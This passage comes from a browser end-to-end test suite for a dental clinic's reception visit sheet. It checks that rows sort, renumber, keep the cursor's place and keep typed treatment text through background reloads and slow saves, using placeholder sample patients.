    await rowOf(name).evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
    await rowOf(name).locator(`select[aria-label^="${label}"]`).selectOption(value);
    await redrawn(name);
    assert.equal(await rowOf(name).locator('input[aria-label^="Treatment details for"]').inputValue(), text, `${name}: what was typed is still in the cell`);
  };
  await typeThenPick('Sample Patient 090', 'UL 016', 'Status for', 'in_treatment');
  await typeThenPick('Sample Patient 096', 'brac 35', 'Doctor group for', '2');
  // and it is saved (the typed change waits about half a second before it is sent)
  const savedNow = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const list = await state.data.listVisits({ branchId: 1, date: localISO() });
    return Object.fromEntries(list.filter((v) => /^Sample Patient 09[06]$/.test(v.patient.full_name)).map((v) => [v.patient.full_name, [v.status, v.doctor_group_id, v.details_text]]));
  });
  const want = { 'Sample Patient 090': ['in_treatment', 3, 'UL 016'], 'Sample Patient 096': ['waiting', 2, 'brac 35'] };
  let saved = await savedNow();
  for (let i = 0; i < 25 && JSON.stringify(saved) !== JSON.stringify(want); i++) { await pb.waitForTimeout(200); saved = await savedNow(); }
  assert.deepEqual(saved, want);
});
// (the order of the rows as the sheet sorts them: by status, the checkup rows after the patients of the same status)
const sortedLikeTheSheet = () => {
  const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
  const keys = [...document.querySelectorAll('table.sheet tbody tr[data-id]')]
    .map((t) => rank[t.querySelector('select[aria-label^="Status for"]').value] * 2 + (t.classList.contains('is-checkup') ? 1 : 0));
  return keys.every((k, i) => i === 0 || keys[i - 1] <= k);
};
// (the patients of the list in the order shown, with their numbers)
const listOrder = () => pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]')].map((t) => `${t.querySelector('td.rownum').textContent} ${t.querySelector('.name-text')?.textContent || t.querySelector('[data-field=patient_name]')?.value}`));
// (another reception computer: changes made in the data, then the list is told, as by a live update)
const elsewhere = (statuses, add = null) => pb.evaluate(async ([s, mr]) => {
  const { state } = await import('/js/state.js');
  const { localISO } = await import('/js/ui/dom.js');
  const list = await state.data.listVisits({ branchId: 1, date: localISO() });
  for (const [n, status] of Object.entries(s)) await state.data.updateVisit(list.find((v) => v.patient.full_name === n).id, { status });
  let added = null;
  if (mr) {
    const p = (await state.data.searchPatients(mr)).find((x) => x.mr_number === mr);
    added = (await state.data.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' })).id;
  }
  document.dispatchEvent(new CustomEvent('sheet-reload'));
  return added;
}, [statuses, add]);
await step('busy day: sorted like the sheet and numbered 1..n; a row whose status is changed keeps its place and number while the cursor is in the table, even through a reload, and moves to its new status once the cursor has left it', async () => {
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name });
  // (looked up and read in one go: a row found first and read after a redraw of the list would be the old, detached copy)
  const where = (name) => pb.evaluate((who) => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(who));
    return { at: tr.sectionRowIndex, n: tr.querySelector('td.rownum').textContent, cursorIn: tr.contains(document.activeElement) };
  }, name);
  const sortedAndNumbered = () => {
    const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
    const trs = [...document.querySelectorAll('table.sheet tbody tr[data-id]')];
    const keys = trs.map((t) => rank[t.querySelector('select[aria-label^="Status for"]').value] * 2 + (t.classList.contains('is-checkup') ? 1 : 0));
    return keys.every((k, i) => i === 0 || keys[i - 1] <= k) && trs.every((t, i) => t.querySelector('td.rownum').textContent === String(i + 1));
  };
  // (a row changed by the step above moves once its quiet reload has run)
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedAndNumbered, null, { timeout: 15000 });
  const before = await where('Sample Patient 105');
  const status = rowOf('Sample Patient 105').locator('select[aria-label^="Status for"]');
  await rowOf('Sample Patient 105').evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
  await status.focus(); // (as a click on it would)
  await status.selectOption('completed');
  await pb.waitForFunction(() => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 105')); return tr && !tr.querySelector('td.pp').dataset.before; });
  const saved = await where('Sample Patient 105');
  assert.deepEqual(saved, { ...before, cursorIn: true }, `saved: the row is drawn again in its place, with its number: ${JSON.stringify([before, saved])}`);
  // a reload in the background (once the 5 seconds after the last key or tap are over) while the cursor is still in the
  // table: nothing moves, the row stays with the cursor in it
  await pb.waitForTimeout(5300);
  const order = await listOrder();
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await pb.waitForTimeout(800);
  assert.deepEqual(await listOrder(), order, 'the list was not drawn again in a new order');
  assert.deepEqual(await where('Sample Patient 105'), { ...before, cursorIn: true }, 'the row with the cursor did not move');
  assert.equal(await status.inputValue(), 'completed');
  // the cursor leaves the table: a few seconds after the last key or tap it goes to the Completed rows, and every row is
  // numbered 1..n again
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForFunction((at) => [...document.querySelectorAll('table.sheet tbody tr')].findIndex((t) => t.textContent.includes('Sample Patient 105')) > at, before.at, { timeout: 15000 });
  assert.ok(await pb.evaluate(sortedAndNumbered), 'sorted and numbered 1..n again');
  assert.notEqual((await where('Sample Patient 105')).n, before.n, 'it has the number of its new place');
  await pb.evaluate(() => document.activeElement?.blur());
});
// (waiting sample patients without dues that no step below needs as they are)
const spareWaiting = () => pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
  .filter((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting').map((t) => t.querySelector('.name-text').textContent)
  .filter((name) => { const n = Number(name.replace('Sample Patient ', '')); return n % 7 && n % 11 && n % 13 && ![87, 88, 89, 94, 95, 97, 100].includes(n); }));
await step('busy day: under the Waiting filter, a row whose status is changed stays shown with the cursor in it, even through a reload, and goes once the cursor has left the table (the rows below never move meanwhile)', async () => {
  const waitingChip = pb.locator('.sheet-counts button', { hasText: 'Waiting' });
  await waitingChip.click();
  await pb.waitForFunction(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]')].every((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting'));
  const name = (await spareWaiting())[2];
  const row = pb.locator('table.sheet tbody tr', { hasText: name });
  const status = row.locator('select[aria-label^="Status for"]');
  // (looked up and read in one go, as where() above)
  const at = () => pb.evaluate((who) => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === who);
    return [tr.sectionRowIndex, tr.contains(document.activeElement)];
  }, name);
  const before = await at();
  await row.evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
  await status.focus(); // (as a click on it would)
  await status.selectOption('in_treatment');
  await pb.waitForFunction((n) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n)); return tr && !tr.querySelector('td.pp').dataset.before; }, name);
  // a reload in the background, once the 5 seconds after the last key or tap are over (a live update, the 20-second check)
  await pb.waitForTimeout(5300);
  const order = await listOrder();
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await pb.waitForTimeout(800);
  assert.deepEqual(await at(), [before[0], true], `${name}: still shown, in its place, with the cursor`);
  assert.deepEqual(await listOrder(), order, 'no row moved');
  assert.equal(await status.inputValue(), 'in_treatment');
  // the cursor leaves the table: it is not Waiting any more, so it goes a few seconds after the last key or tap
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await row.waitFor({ state: 'detached', timeout: 15000 });
  assert.ok(await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]')].every((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting')), 'only Waiting rows');
  await waitingChip.click(); // (all rows again)
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr[data-id]').length > 120);
});
await step('busy day, slow server: Enter on a status chip saves it without opening its list, so Shift+Tab reaches Treatment and what is typed there is saved too (it never becomes a pick from the list)', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__updateVisit = d.updateVisit;
    d.updateVisit = async (...a) => { await new Promise((r) => setTimeout(r, 700)); return window.__updateVisit.apply(d, a); };
  });
  const name = (await spareWaiting())[0];
  const row = pb.locator('table.sheet tbody tr', { hasText: name });
  const was = await row.locator(`input[aria-label="Treatment for ${name}"]`).inputValue();
  await row.locator('select[aria-label^="Status for"]').focus();
  await pb.keyboard.press('ArrowDown');
  await pb.keyboard.press('Enter');
  assert.equal(await pb.evaluate(() => document.activeElement.matches(':open')), false, 'the list is not open');
  await pb.keyboard.press('Shift+Tab');
  assert.equal(await pb.evaluate(() => document.activeElement.getAttribute('aria-label')), `Treatment for ${name}`);
  await pb.keyboard.press('End');
  await pb.keyboard.type(' scaling', { delay: 30 });
  await pb.waitForTimeout(1000); // (the status answer has come back and the row is drawn again)
  await pb.keyboard.press('Tab');
  const savedNow = () => pb.evaluate(async (n) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === n);
    return [v.status, v.treatment_label];
  }, name);
  const want = ['in_treatment', `${was} scaling`];
  let saved = await savedNow();
  for (let i = 0; i < 30 && JSON.stringify(saved) !== JSON.stringify(want); i++) { await pb.waitForTimeout(200); saved = await savedNow(); }
  assert.deepEqual(saved, want);
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__updateVisit; document.activeElement?.blur(); });
});
await step('busy day, slow server: text typed in a Treatment cell (it saves when the cell is left) while the same row\'s status is being saved stays in the cell when the row is drawn again, and is saved', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__updateVisit = d.updateVisit;
    d.updateVisit = async (...a) => { await new Promise((r) => setTimeout(r, 1500)); return window.__updateVisit.apply(d, a); };
  });
  const r100 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 100' });
  const cell = r100.locator('input[aria-label="Treatment for Sample Patient 100"]');
  await r100.locator('select[aria-label^="Status for"]').selectOption('in_treatment');
  await r100.evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; }); // (the row's cells drawn again from the status answer are new cells)
  await cell.click();
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('RCT 2nd sitting');
  await pb.waitForFunction(() => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 100')); return tr && !tr.querySelector('td.pp').dataset.before; });
  assert.equal(await r100.locator('select[aria-label^="Status for"]').inputValue(), 'in_treatment');
  assert.equal(await cell.inputValue(), 'RCT 2nd sitting', 'what was typed is still in the cell');
  assert.ok(await cell.evaluate((el) => el === document.activeElement), 'and the cursor is still in it');
  await pb.keyboard.type(' more');
  await pb.keyboard.press('Tab');
  const savedNow = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === 'Sample Patient 100');
    return [v.status, v.treatment_label];
  });
  let saved = await savedNow();
  for (let i = 0; i < 25 && saved[1] !== 'RCT 2nd sitting more'; i++) { await pb.waitForTimeout(200); saved = await savedNow(); }
  assert.deepEqual(saved, ['in_treatment', 'RCT 2nd sitting more']);
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__updateVisit; });
});
await step('busy day, slow server: a reload in the background that comes back while someone types in a cell does not wipe what they typed; it is drawn once they leave the list', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__listVisits = d.listVisits;
    // (the list is read at once and its answer arrives 900 ms later, so it does not have what is typed meanwhile)
    d.listVisits = async (...a) => { const list = await window.__listVisits.apply(d, a); await new Promise((r) => setTimeout(r, 900)); return list; };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload')); // (as a live update or the 20-second check)
  });
  const details = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 020' }).locator('input[aria-label^="Treatment details for"]');
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' brac35');
  await pb.waitForTimeout(1300); // the reload has come back meanwhile
  assert.equal(await details.inputValue(), 'U L 018 PC refresh brac35');
  await pb.keyboard.type(' ok');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  assert.equal(await details.inputValue(), 'U L 018 PC refresh brac35 ok');
  // leaving the list: the reload that waited is drawn (a few seconds after the last key), with what was saved
  await details.evaluate((el) => { el.closest('tr').dataset.before = 'yes'; });
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForFunction(() => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 020')); return tr && !tr.dataset.before; }, null, { timeout: 15000 });
  assert.equal(await details.inputValue(), 'U L 018 PC refresh brac35 ok');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__listVisits; });
});
await step('busy day: with the cursor waiting in the Treatment cell of a patient just added by Mr#, rows the other computers change are drawn again where they are (nothing moves, typed text stays); the list is sorted once the cursor has left the table', async () => {
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill('9820');
  await box.press('Enter');
  const inNewRow = () => pb.evaluate(() => !!document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr').textContent.includes('Mr# 9820'));
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9820'));
  const statusOf = (name) => pb.evaluate((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n))?.querySelector('select[aria-label^="Status for"]').value, name);
  const shows = (name, status, timeout) => pb.waitForFunction(([n, s]) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n))?.querySelector('select[aria-label^="Status for"]').value === s, [name, status], { timeout });
  const order = await listOrder();
  await elsewhere({ 'Sample Patient 095': 'in_treatment' });
  await shows('Sample Patient 095', 'in_treatment', 4000);
  assert.ok(await inNewRow(), 'the cursor stays in the Treatment cell');
  assert.deepEqual(await listOrder(), order, 'drawn again where it was: no row moved');
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('Bonding');
  await elsewhere({ 'Sample Patient 094': 'in_treatment' });
  await shows('Sample Patient 094', 'in_treatment', 4000);
  assert.deepEqual(await listOrder(), order, 'still no row moved');
  assert.ok(await inNewRow(), 'the cursor is still in the Treatment cell');
  assert.equal(await pb.evaluate(() => document.activeElement?.value), 'Bonding', 'what was typed is still there');
  // Tab saves the cell and stays in the table: nothing moves yet; the cursor leaving the table lets the list be sorted
  await pb.keyboard.press('Tab');
  await pb.waitForTimeout(800);
  assert.deepEqual(await listOrder(), order, 'the cursor is in the table: no row moved');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForFunction(() => {
    const names = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].map((t) => [t.querySelector('.name-text')?.textContent, t.querySelector('select[aria-label^="Status for"]').value]);
    const at = (n) => names.findIndex(([x]) => x === n);
    return at('Sample Patient 094') > names.findLastIndex(([, s]) => s === 'waiting') && at('Sample Patient 095') > names.findLastIndex(([, s]) => s === 'waiting');
  }, null, { timeout: 15000 });
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  assert.equal(await statusOf('Sample Patient 094'), 'in_treatment');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9820' }).locator('input[aria-label^="Treatment for"]').inputValue(), 'Bonding');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: Treatment cells typed in and left with the text they had (nothing to save) do not hold up what the other computers change', async () => {
  const cellOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name }).locator(`input[aria-label="Treatment for ${name}"]`);
  const was = {};
  // the same treatment typed over itself, and Enter (twice), then a letter typed and taken back
  for (const name of ['Sample Patient 088', 'Sample Patient 089']) {
    was[name] = await cellOf(name).inputValue();
    await cellOf(name).click();
    await pb.keyboard.press('Control+A');
    await pb.keyboard.type(was[name]);
    await pb.keyboard.press('Enter');
  }
  was['Sample Patient 087'] = await cellOf('Sample Patient 087').inputValue();
  await cellOf('Sample Patient 087').click();
  await pb.keyboard.press('End');
  await pb.keyboard.type('x');
  await pb.keyboard.press('Backspace');
  await pb.locator('h1').click(); // (the cursor leaves the list)
  // another reception computer changes a row, as a live update tells the list
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === 'Sample Patient 097');
    await state.data.updateVisit(v.id, { status: 'in_treatment' });
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  });
  await pb.waitForFunction(() => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 097'))?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', null, { timeout: 12000 });
  for (const [name, value] of Object.entries(was)) assert.equal(await cellOf(name).inputValue(), value, `${name} keeps its treatment`);
});
await step('busy day: after a row\'s dialog adds the Dr. Ali flag, an invoice from the Pending chip, or a note and a payment, focus goes back to that patient\'s row, not to the page heading', async () => {
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name });
  const focused = () => pb.evaluate(() => { const el = document.activeElement; return [el?.closest('tr')?.querySelector('.name-text')?.textContent || el?.localName, el?.dataset.focus || '']; });
  const dialogs = pb.locator('.modal');
  // the flag (the row shows no flag: it is on the profile; the list is drawn again), from the keyboard: Enter on the name or the
  // month chip, the flag, Escape
  for (const [name, key] of [['Sample Patient 088', 'patient'], ['Sample Patient 089', 'month']]) {
    await rowOf(name).locator(`[data-focus="${key}"]`).focus();
    await pb.keyboard.press('Enter');
    await dialogs.getByRole('button', { name: 'Next appointment with Dr. Ali' }).click();
    await dialogs.getByLabel('Reason').fill('Sample: check the wire');
    await rowOf(name).evaluate((tr) => { tr.dataset.before = 'yes'; });
    await dialogs.getByRole('button', { name: 'Flag for Dr. Ali' }).click();
    await pb.waitForFunction((who) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(who)); return tr && !tr.dataset.before; }, name);
    await pb.waitForFunction(() => document.querySelectorAll('.modal').length === 1);
    await pb.keyboard.press('Escape');
    await pb.waitForSelector('.modal', { state: 'detached' });
    assert.deepEqual(await focused(), [name, key], `${name}: back on the control that opened the dialog`);
  }
  // a new invoice from the Pending chip, which turns Done (no button): once the bill shown after saving is closed, back on the
  // patient's name
  const r18 = rowOf('Sample Patient 018');
  await r18.locator('button.invoice-pending').focus();
  await pb.keyboard.press('Enter');
  await dialogs.getByLabel('Treatment, line 1').fill('Checkup');
  await dialogs.getByLabel('Rate (Rs), line 1').fill('1500');
  await dialogs.getByRole('button', { name: 'Save', exact: true }).click();
  await pb.locator('.modal h2', { hasText: /^Invoice INV-/ }).waitFor();
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
  await r18.locator('span.chip:text-is("Done")').waitFor();
  await pb.waitForFunction(() => document.activeElement?.matches('.name-btn') && document.activeElement.closest('tr').textContent.includes('Sample Patient 018'));
  // a note typed in the row's dialog, then a payment taken there, then Escape
  await rowOf('Sample Patient 014').locator('.name-btn').focus();
  await pb.keyboard.press('Enter');
  await dialogs.getByLabel('Notes').fill('Sample: pays on Friday');
  await dialogs.getByRole('button', { name: 'Take payment' }).click();
  await pb.locator('.modal:has(h2:has-text("Take payment · Sample Patient 014"))').getByRole('button', { name: 'Save payment' }).click();
  await pb.waitForFunction(() => /^0/.test([...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 014'))?.querySelector('td.pp').innerText));
  await pb.waitForFunction(() => document.querySelectorAll('.modal').length === 1);
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.deepEqual(await focused(), ['Sample Patient 014', 'patient']);
  await expectNote(pb, 'Sample Patient 014', 'Sample: pays on Friday');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: a mouse that only rests on the rows does not hold the list: what other computers change is sorted in at once (a new patient at their place, not at the end), and the list does not scroll; a click in the table holds the order for 5 seconds', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const waiting = await spareWaiting();
  assert.ok(waiting.length >= 9, 'waiting rows: ' + waiting.length);
  const nameRow = (n) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${n}")`) });
  const scrollTop = () => pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop);
  const below = (moved, still, timeout = 12000) => pb.waitForFunction(([a, b]) => {
    const names = [...document.querySelectorAll('table.sheet tbody tr[data-id] .name-text')].map((e) => e.textContent);
    return names.indexOf(a) > names.indexOf(b);
  }, [moved, still], { timeout });
  // the list scrolled down a little, and the mouse resting on the name of a waiting patient (no key, no click, for more
  // than 5 seconds)
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollTop = 100; });
  const box = await nameRow(waiting[6]).locator('.name-btn').boundingBox();
  await pb.mouse.move(box.x + box.width / 2, box.y + box.height / 2 - 10);
  await pb.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  const top = await scrollTop();
  assert.ok(top > 50, 'scrolled: ' + top);
  await pb.waitForTimeout(5200);
  // another computer marks two waiting patients above it In treatment and puts Mr# 9833 on the list: sorted in at once
  await elsewhere({ [waiting[1]]: 'in_treatment', [waiting[2]]: 'in_treatment' }, '9833');
  await below(waiting[1], waiting[6], 2000);
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  const added = await pb.evaluate(() => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].find((t) => t.textContent.includes('Mr# 9833'));
    return { last: !tr.nextElementSibling, status: tr.querySelector('select[aria-label^="Status for"]').value, next: tr.nextElementSibling?.querySelector('select[aria-label^="Status for"]')?.value };
  });
  assert.deepEqual(added, { last: false, status: 'waiting', next: 'waiting' }, 'the new patient is among the waiting ones, not at the end');
  assert.equal(await scrollTop(), top, 'the list did not scroll by itself');
  assert.equal(await pb.locator('.sheet-new-rows').innerText(), '', 'no note of new rows: they are on the list');
  // a click in the table, on a cell with nothing to click (a token): for the 5 seconds after it nothing moves, a row changed
  // elsewhere is drawn again where it is; then the list is sorted
  await nameRow(waiting[8]).locator('.token').click();
  const clicked = Date.now();
  const order = await listOrder();
  await elsewhere({ [waiting[3]]: 'in_treatment' });
  await pb.waitForFunction((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', waiting[3], { timeout: 4000 });
  assert.deepEqual(await listOrder(), order, 'drawn again where it was: no row moved');
  await below(waiting[3], waiting[8]);
  assert.ok(Date.now() - clicked >= 4500, 'sorted only once the 5 seconds were over: ' + (Date.now() - clicked));
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  await pb.mouse.move(5, 5);
});
await step('busy day, slow server: a patient added by Mr# while a reload in the background is on its way stays on the list, with the cursor in their Treatment cell, when that older answer comes back', async () => {
  await pb.mouse.move(5, 5); // (the keyboard only)
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits; // (kept once: a step that failed before putting it back leaves no stub to wrap)
    window.__asked = 0;
    // (the whole list is read at once and its answer arrives 1.5 s later; one patient's visits answer at once)
    d.listVisits = async (args) => {
      const list = await window.__realListVisits.call(d, args);
      if (!args.patientId) { window.__asked += 1; await new Promise((r) => setTimeout(r, 1500)); }
      return list;
    };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload')); // (a live update, or the 20-second check)
  });
  await pb.waitForFunction(() => window.__asked > 0, null, { timeout: 10000 }); // (the reload is on its way)
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill('9834');
  await box.press('Enter');
  const inRow = () => !!document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr').textContent.includes('Mr# 9834');
  await pb.waitForFunction(inRow, null, { timeout: 5000 });
  await pb.waitForTimeout(2000); // the older answer, without Mr# 9834, has come back meanwhile
  assert.ok(await pb.evaluate(inRow), 'the row is still on the list, with the cursor in its Treatment cell');
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('Bracket fix');
  await pb.keyboard.press('Tab');
  const row = pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9834' });
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Bracket fix');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; document.activeElement?.blur(); });
  const saved = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).filter((v) => v.patient.mr_number === '9834').map((v) => v.treatment_label);
  });
  for (let i = 0; i < 30 && JSON.stringify(await saved()) !== '["Bracket fix"]'; i++) await pb.waitForTimeout(200);
  assert.deepEqual(await saved(), ['Bracket fix'], 'one visit, with what was typed');
  assert.equal(await row.count(), 1);
});
await step('busy day, slow server: a cell typed and saved while a slow reload is on its way keeps what was typed when that older answer comes back, and the next key carries on from it', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    window.__asked = 0;
    window.__answered = 0;
    d.listVisits = async (args) => {
      const list = await window.__realListVisits.call(d, args);
      if (!args.patientId) { window.__asked += 1; await new Promise((r) => setTimeout(r, 7000)); window.__answered += 1; }
      return list;
    };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  });
  await pb.waitForFunction(() => window.__asked > 0, null, { timeout: 10000 });
  const details = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 040' }).locator('input[aria-label^="Treatment details for"]');
  const was = await details.inputValue();
  await details.focus();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' U L 016');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  // the answer asked for before the typing comes back more than 5 seconds after the last key
  await pb.waitForFunction(() => window.__answered > 0, null, { timeout: 12000 });
  await pb.waitForTimeout(300);
  assert.equal(await details.inputValue(), `${was} U L 016`, 'what was typed is still in the cell');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; });
  await pb.keyboard.type('X');
  const saved = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === 'Sample Patient 040').details_text;
  });
  for (let i = 0; i < 30 && (await saved()) !== `${was} U L 016X`; i++) await pb.waitForTimeout(200);
  assert.equal(await saved(), `${was} U L 016X`, 'saved with the key typed after it');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: the Mr# of a patient another computer has just put on the list (this screen has not been drawn again yet) goes to their row, with no second visit', async () => {
  // (this screen's reloads do not have Mr# 9835 yet: a live update held up while someone types in the list)
  const name = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    d.listVisits = async (args) => { const list = await window.__realListVisits.call(d, args); return args.patientId ? list : list.filter((v) => v.patient.mr_number !== '9835'); };
    const p = (await d.searchPatients('9835')).find((x) => x.mr_number === '9835');
    await d.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' });
    return p.full_name;
  });
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9835' }).count(), 0, 'not on this screen yet');
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill('9835');
  await box.press('Enter');
  await pb.waitForSelector(`.toast:has-text("${name} is already on the list")`);
  await pb.waitForFunction(() => document.activeElement?.matches('select[aria-label^="Status for"]') && document.activeElement.closest('tr').textContent.includes('Mr# 9835'));
  const visits = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    state.data.listVisits = window.__realListVisits;
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).filter((v) => v.patient.mr_number === '9835').length;
  });
  assert.equal(visits, 1, 'no second visit');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9835' }).count(), 1);
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day at 1366x768: Treatment Details is about as wide as the sheet\'s column (a typical entry whole), and a longer one is whole in its tooltip, kept up to date while typing', async () => {
  await pb.mouse.move(5, 5);
  const details = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 041' }).locator('input[aria-label^="Treatment details for"]');
  const look = () => details.evaluate((el) => ({ width: Math.round(el.closest('td').getBoundingClientRect().width), cut: el.scrollWidth > el.clientWidth, title: el.title, value: el.value }));
  await details.focus();
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('UL 018 full arch PC refresh');
  let l = await look();
  assert.ok(l.width >= 250 && !l.cut && l.title === l.value, 'a typical entry is whole: ' + JSON.stringify(l));
  await pb.keyboard.type(', LL3 LL4 rebond, elastics given, next visit wire change');
  l = await look();
